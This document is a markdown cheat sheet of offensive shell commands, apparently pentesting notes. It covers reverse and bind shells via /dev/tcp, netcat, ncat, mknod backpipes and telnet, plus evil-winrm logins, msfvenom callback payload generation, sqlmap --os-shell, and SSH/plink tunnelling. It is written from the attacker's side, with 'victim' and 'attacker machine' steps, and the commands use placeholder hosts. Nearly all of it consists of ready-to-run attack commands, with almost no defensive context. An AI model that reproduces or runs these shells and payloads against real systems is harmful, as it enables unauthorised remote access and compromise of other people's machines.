# [/dev/tcp](https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/):
#### `sh -i >& /dev/tcp/X.X.X.X/YYY 0>&1`
  * [archived](https://web.archive.org/web/20190920152858/https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/)

# [evil-winrm](https://github.com/Hackplayers/evil-winrm):
#### `evil-winrm -i X.X.X.X -u <usenamer> -p <password>`
#### `evil-winrm -i X.X.X.X -u <username> -p -s <path/to/ps1>`
  * -s allows yoiu to load powershell scripts from Kali to the victim

# [mknod](https://man7.org/linux/man-pages/man1/mknod.1.html):
#### `mknod /tmp/backpipe p`
#### `/bin/sh 0</tmp/backpipe | nc X.X.X.X YYY 1>/tmp/backpipe`
#### `mknod /tmp/backpipe p && telnet X.X.X.X YYY 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe`
  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

# [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
  * -p chooses the payload
  * -n prepends a nop sled
  * -a chooses the architecture
  * -b defines bad chars so it won't use them (as a string)
  * -o is the output file
  * -f defines the output format (for instance, a c file)
  * --platform chooses the platform (for instance, windows)
  * LHOST handles the callback ip
  * LPORT handles the callback port

# [ncat](https://linux.die.net/man/1/ncat):
#### `ncat -lnvp YYY`
#### `ncat X.X.X.X YYY -e (/bin/sh or cmd.exe)`
#### `ncat -lnvp --ssl --allow Z.Z.Z.Z YYY`
#### `ncat X.X.X.X YYY -ssl (/bin/sh or cmd.exe)`
  * basically a netcat rewrite with some updated features
  * --ssl will encrypt the traffic using a temporary key
  * --allow will only allow connections from the specified host

# [netcat](https://linux.die.net/man/1/nc):
#### `nc -lnvp YYY`
#### `nc X.X.X.X YYY -e (/bin/sh or cmd.exe)`
#### `nc -lnvp YYY -e (/bin/sh or cmd.exe)`
#### `nc X.X.X.X YYY`
#### `nc -lnvp YYY > (name.sh or name.exe)`
#### `nc X.X.X.X YYY < (name.sh or name.exe)`
  * -e binds a command
  * -l listens
  * -p is the source port
  * -n prevents DNS lookups on addresses, hostnames, and ports

# [sqlmap](https://web.archive.org/web/20191201191308/https://github.com/sqlmapproject/sqlmap/wiki/Introduction):
#### `sqlmap -u X.X.X.X --crawl=1`
#### `sqlmap -u X.X.X.X/resource.php --dbms=mysql --os-shell`
  * -u specifies the url of the target
  * -l allows you to input an intercept file from burp
  * -f does dbms fingerprinting
  * --crawl does enumeration
  * --os-shell tries to get an interactive shell

# [ssh](https://linux.die.net/man/1/ssh):
#### `plink -l <username> -pw <password> X.X.X.X -R YYY:A.A.A.A:BBB`
#### `ssh -D YYY <username>@X.X.X.X`
  * -R binds a remote server's (X.X.X.X) port (YYY) to the local server's (A.A.A.A) port (BBB) using the remote server's credentials
  * -D specifies a local dynamic application-level port forwarder

# [telnet](https://linux.die.net/man/1/telnet):
#### `nc -nlvp YYY`
#### `nc -nlvp ZZZ`
#### `telnet X.X.X.X YYY | /bin/sh | telnet X.X.X.X ZZZ`
  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
  * Run the top two commands on the attacker machine, then the bottom command on the victim
  * Type commands into the first shell window, then read the output from the second shell window
